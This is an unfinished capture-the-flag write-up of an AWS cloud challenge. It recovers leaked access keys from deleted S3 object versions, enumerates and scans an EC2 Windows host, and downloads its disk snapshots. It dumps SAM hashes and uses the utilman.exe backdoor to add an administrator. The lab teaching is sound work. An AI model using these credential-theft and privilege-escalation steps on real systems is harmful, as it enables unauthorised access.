# [Cloud - insane] Ascetism

This challenge was not fully finished, but this page sums up the steps taken. For a full write-up, HTB created their own version [here](https://github.com/hackthebox/business-ctf-2024/tree/main/cloud/%5BInsane%5D%20Asceticism).

We are given an AWS access key and secret to start.

```bash
$ cat asceticism.csv
Access key ID,Secret access key, Region Name
AKIAXYAFLIG2DFBKVWHJ,AyOOKTDrBkaHCaaGuLKlD8VNlJvfp8T/f8k/D7+U, us-east-1
```

Which authenticates the user

```bash
$ aws sts get-caller-identity
{
    "UserId": "AIDAXYAFLIG2LURZLZAH6",
    "Account": "532587168180",
    "Arn": "arn:aws:iam::532587168180:user/kstone-dev"
}
```

A very common place to start is to list buckets and their content

```bash
$ aws s3api list-buckets
{
    "Buckets": [
        {
            "Name": "vault11-reports",
            "CreationDate": "2024-05-07T14:07:20+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "cloudchalls",
        "ID": "68fd0ca8813f6724859c6784d15f5d36a5dbb1965be025a4269b571ee1243500"
    }
}

$ aws s3 ls s3://vault11-reports
                           PRE flag/
$ aws s3 ls s3://vault11-reports/flag/
2024-05-07 22:07:25         43 flag.txt
```

Another common trick is to list version of objects

```bash
$ aws s3api list-object-versions --bucket vault11-reports
{
    "Versions": [
        {
            "ETag": "\"6b564bebe58e7e0248f75e7f29d0fa92\"",
            "Size": 43,
            "StorageClass": "STANDARD",
            "Key": "flag/flag.txt",
            "VersionId": "NEFppRCQhcniRuXAMLx68l3rFLK1PYQv",
            "IsLatest": true,
            "LastModified": "2024-05-07T14:07:25+00:00",
            "Owner": {
                "DisplayName": "cloudchalls",
                "ID": "68fd0ca8813f6724859c6784d15f5d36a5dbb1965be025a4269b571ee1243500"
            }
        },
        {
            "ETag": "\"d6e420ebcdf3c9a7104b7f8a2e394749\"",
            "Size": 94,
            "StorageClass": "STANDARD",
            "Key": "snapper_accessKeys.csv",
            "VersionId": "O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi",
            "IsLatest": false,
            "LastModified": "2024-05-07T14:07:25+00:00",
            "Owner": {
                "DisplayName": "cloudchalls",
                "ID": "68fd0ca8813f6724859c6784d15f5d36a5dbb1965be025a4269b571ee1243500"
            }
        }
    ],
    "DeleteMarkers": [
        {
            "Owner": {
                "DisplayName": "cloudchalls",
                "ID": "68fd0ca8813f6724859c6784d15f5d36a5dbb1965be025a4269b571ee1243500"
            },
            "Key": "snapper_accessKeys.csv",
            "VersionId": "cIRoz8pEt1neDMlRsQVzCqr8_cBy.fQ.",
            "IsLatest": true,
            "LastModified": "2024-05-07T15:20:15+00:00"
        }
    ],
    "RequestCharged": null
}
```

The deleted `snapper_accessKeys.csv` can be downloaded, and we are given another set of credentials

```bash
$ aws s3api get-object --bucket vault11-reports --key snapper_accessKeys.csv --version-id O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi snapper_accessKeys.csv
{
    "AcceptRanges": "bytes",
    "LastModified": "2024-05-07T14:07:25+00:00",
    "ContentLength": 94,
    "ETag": "\"d6e420ebcdf3c9a7104b7f8a2e394749\"",
    "VersionId": "O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi",
    "ContentType": "application/octet-stream",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}

$ cat snapper_accessKeys.csv
Access key ID,Secret access key
AKIAXYAFLIG2CSJQ4R5Y,BGTlUZBVjhdydUk9AMMG+X5b+1fzsvdstY8xVet6

$ aws sts get-caller-identity
{
    "UserId": "AIDAXYAFLIG2MDXEPN7XP",
    "Account": "532587168180",
    "Arn": "arn:aws:iam::532587168180:user/snapper"
}
```

This new user is allowed to list instances

```bash
$ aws ec2 describe-instances
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0a62069ec7788c8be",
                    "InstanceId": "i-0e5dabca0fa9f222f",
                    "InstanceType": "t2.medium",
                    "KeyName": "felamos",
                    "LaunchTime": "2024-05-07T15:23:42+00:00",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "us-east-1d",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "Platform": "windows",
                    "PrivateDnsName": "ip-172-31-93-160.ec2.internal",
                    "PrivateIpAddress": "172.31.93.160",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
                    "PublicIpAddress": "54.208.244.117",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-0a5022ff1dfdf5518",
                    "VpcId": "vpc-0d7b2c5c8509574bd",
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2024-05-07T14:07:29+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-0ed252fb0ff6d55cf"
                            }
                        },
                        {
                            "DeviceName": "/dev/xvdb",
                            "Ebs": {
                                "AttachTime": "2024-05-07T14:08:25+00:00",
                                "DeleteOnTermination": false,
                                "Status": "attached",
                                "VolumeId": "vol-075ee6a3f4c846e85"
                            }
                        }
                    ],
                    "ClientToken": "terraform-20240507140721457700000006",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "IamInstanceProfile": {
                        "Arn": "arn:aws:iam::532587168180:instance-profile/WindowsVM-KMS",
                        "Id": "AIPAXYAFLIG2AFHEWFQRZ"
                    },
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
                                "PublicIp": "54.208.244.117"
                            },
                            "Attachment": {
                                "AttachTime": "2024-05-07T14:07:28+00:00",
                                "AttachmentId": "eni-attach-0d7e27209eb92dd1a",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupName": "default",
                                    "GroupId": "sg-0b563effdfa72bdfa"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "12:c9:45:34:ce:dd",
                            "NetworkInterfaceId": "eni-02abef5d6c2dc4c8e",
                            "OwnerId": "532587168180",
                            "PrivateDnsName": "ip-172-31-93-160.ec2.internal",
                            "PrivateIpAddress": "172.31.93.160",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
                                        "PublicIp": "54.208.244.117"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-172-31-93-160.ec2.internal",
                                    "PrivateIpAddress": "172.31.93.160"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-0a5022ff1dfdf5518",
                            "VpcId": "vpc-0d7b2c5c8509574bd",
                            "InterfaceType": "interface"
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupName": "default",
                            "GroupId": "sg-0b563effdfa72bdfa"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Tags": [
                        {
                            "Key": "Name",
                            "Value": "Vault11-WS01"
                        }
                    ],
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 2,
                        "ThreadsPerCore": 1
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "PlatformDetails": "Windows",
                    "UsageOperation": "RunInstances:0002",
                    "UsageOperationUpdateTime": "2024-05-07T14:07:28+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios"
                }
            ],
            "OwnerId": "532587168180",
            "ReservationId": "r-062728f84e63857da"
        }
    ]
}
```

This instance allows Remote Desktop and Samba

```bash
$ nmap -A -T4 --top-ports 1000 -Pn 54.208.244.117
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-18 17:01 BST
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for ec2-54-208-244-117.compute-1.amazonaws.com (54.208.244.117)
Host is up (0.23s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: EC2AMAZ-QLP7LVM
|   NetBIOS_Domain_Name: EC2AMAZ-QLP7LVM
|   NetBIOS_Computer_Name: EC2AMAZ-QLP7LVM
|   DNS_Domain_Name: EC2AMAZ-QLP7LVM
|   DNS_Computer_Name: EC2AMAZ-QLP7LVM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-18T16:02:05+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-QLP7LVM
| Not valid before: 2024-05-06T13:55:36
|_Not valid after:  2024-11-05T13:55:36
|_ssl-date: 2024-05-18T16:02:44+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-05-18T16:02:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.77 seconds
```

That user is however also allowed describe snapshots of volumes

```bash
$ aws ec2 describe-snapshots --owner-ids self
{
    "Snapshots": [
        {
            "Description": "Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16",
            "Encrypted": false,
            "OwnerId": "532587168180",
            "Progress": "100%",
            "SnapshotId": "snap-04d68f6296b5893de",
            "StartTime": "2024-05-08T10:08:05.509000+00:00",
            "State": "completed",
            "VolumeId": "vol-0ed252fb0ff6d55cf",
            "VolumeSize": 30,
            "StorageTier": "standard"
        },
        {
            "Description": "Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16",
            "Encrypted": false,
            "OwnerId": "532587168180",
            "Progress": "100%",
            "SnapshotId": "snap-09a2dac60106057d8",
            "StartTime": "2024-05-08T10:08:05.509000+00:00",
            "State": "completed",
            "VolumeId": "vol-075ee6a3f4c846e85",
            "VolumeSize": 1,
            "StorageTier": "standard"
        },
        {
            "Description": "Windows Backup Drive Snapshot",
            "Encrypted": false,
            "OwnerId": "532587168180",
            "Progress": "100%",
            "SnapshotId": "snap-00197900d5ed8277e",
            "StartTime": "2024-05-07T15:11:58.748000+00:00",
            "State": "completed",
            "VolumeId": "vol-075ee6a3f4c846e85",
            "VolumeSize": 1,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "Backup"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}
```

From there we can download the volume content using the [coldsnap](https://github.com/awslabs/coldsnap) tool

```bash
$ cargo install --locked coldsnap
$ /Users/pierre.gaulon/.cargo/bin/coldsnap download snap-04d68f6296b5893de 30g.raw
$ /Users/pierre.gaulon/.cargo/bin/coldsnap download snap-09a2dac60106057d8 1g.raw
$ /Users/pierre.gaulon/.cargo/bin/coldsnap download snap-00197900d5ed8277e backup.raw

$ VBoxManage convertfromraw --format VDI 30g.raw 30g.vdi
Converting from raw image file="disk.img" to file="snapshot.vdi"...
Creating dynamic image with size 1073741824 bytes (1024MB)...

# same process with the 2 others
```

From there we can spin up a [Windows10 image](https://www.microsoft.com/en-au/software-download/windows10ISO) via [VirtualBox](https://www.virtualbox.org/) and attach the disk to it.

The backup disk (`backup.vdi`) contains a `.vhdx` file which we can copy to our host using drag-n-drop, convert it to `.vdi` and mount it as well.

```bash
$ VBoxManage clonemedium 9546e6c7-0000-0000-0000-100000000000.vhdx backup-in-backup.vdi --format VDI
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Clone medium created in format 'VDI'. UUID: 1acc61a5-b5e0-47e5-a9aa-b6660af07e07
```

It contains a backup of Windows `system32`, which itself contains the files `SAM` and `SYSTEM`. Copying the files to a kali machine we can inspect their content

```bash
┌──(vagrant㉿kali)-[/vagrant]
└─$ samdump2 SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

This is not helpful as `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash and `31d6cfe0d16ae931b73c59d7e0c089c0` is the blank newer NTLM hash.

Continuing to dig, we can also mount the main operating system using the `30g.vdi`. Exploring it, we can find the output of AWS SSM starting up the EC2 machine.

```powershell
PS F:\ProgramData\Amazon\EC2-Windows\Launch\Log> type .\Ec2Launch.log
2024/05/07 14:09:59Z: Adding DNS suffixes in search list done
2024/05/07 14:09:59Z: Executing boot volume extension
2024/05/07 14:10:02Z: Finish executing boot volume extension
2024/05/07 14:10:02Z: Setting monitor to always be on
2024/05/07 14:10:19Z: Successfully set monitor always on
2024/05/07 14:10:19Z: HibernationEnabled: false
2024/05/07 14:10:19Z: Sending telemetry int: AdminPasswordTypeCode
2024/05/07 14:10:19Z: Generating a random password...
2024/05/07 14:10:23Z: Username: Administrator
2024/05/07 14:10:23Z: Password: <Password>
MJKuefMp14PUYKD0bDkXV7CgJIhVhhQwg57wIrCpJ3bhYt2oxsicy6PjIwSzINR4Z85Ux++jyX06QNIV9A+9jS7saXoLep17A4GOH897SiTYRJY4bNc5d0FBHAGCJ2lBiUNySyhKClaEC4+koQw/XrIGN7YcQeqo+hDwZCFY8iIvfI0qyDkouTd/PsPq046miFqCYk/3xB7huTW3ue0Rcrs0k0RALnAq9at9uUdUYRZGndcV9zh33KscZK29T59wyhxutbHTy/ePr0FdeXTvqyooSu/vc62fWweUWUjQdJBAJucrxW+d+AclR+u8/xq1m1OIxlfT0qOjFfMiFWccuw==
</Password>
2024/05/07 14:10:24Z: Failed to get metadata: The result from http://169.254.169.254/latest/user-data was empty
2024/05/07 14:10:25Z: Finalizing telemetry
2024/05/07 14:10:25Z: EC2LaunchTelemetry: IsTelemetryEnabled=true
2024/05/07 14:10:25Z: EC2LaunchTelemetry: AgentOsArch=windows_amd64
2024/05/07 14:10:25Z: EC2LaunchTelemetry: IsAgentScheduledPerBoot=false
2024/05/07 14:10:25Z: EC2LaunchTelemetry: AgentCommandErrorCode=0
2024/05/07 14:10:25Z: EC2LaunchTelemetry: AdminPasswordTypeCode=0
2024/05/07 14:10:25Z: Message: Windows is Ready to use
2024/05/07 14:10:31Z: Starting job 'AmazonSSMAgent'.
2024/05/07 14:10:42Z: Job 'AmazonSSMAgent' is still in the Running state. Waiting...
2024/05/07 14:10:43Z: Job 'AmazonSSMAgent' finished with 'Completed' status. Job output:
2024/05/07 14:10:43Z: Initializing instance is done
2024/05/07 14:10:43Z: Telemetry already finalized. Skipping finalize.
```

Same here this is not helpful: the administrator password is encrypted, using the private key created within AWS.

As a last attempt, we can boot the OS and create a new admin user by using the `utilman.exe` trick:

- from Windows10, with the 30g disk mounted
- change the ownershipt from TrustedInstaller to the current user of the `30g.vdi` disk folder System32
- `ren d:\windows\system32\utilman.exe utilman.exe.bak`
- `copy d:\windows\system32\cmd.exe d:\windows\system32\utilman.exe`
- switch `win10.vdi` to `30g.vdi`
- boot in safe mode using F8
- launch `cmd.exe` from the logo of Utilman
```powershell
net user /add admin password12345@
net localgroup administrators admin /add
net user admin /active:yes
```
- and finally switch to the `admin` user


The `Administrator` user Desktop contains an encrypted powershell script

```powershell
PS F:\Users\Administrator\Desktop> dir

    Directory: F:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          5/7/2024  11:31 PM           1125 backup.ps1.enc
-a----         6/21/2016  11:36 PM            527 EC2 Feedback.website
-a----         6/21/2016  11:36 PM            554 EC2 Microsoft Windows Guide.website
```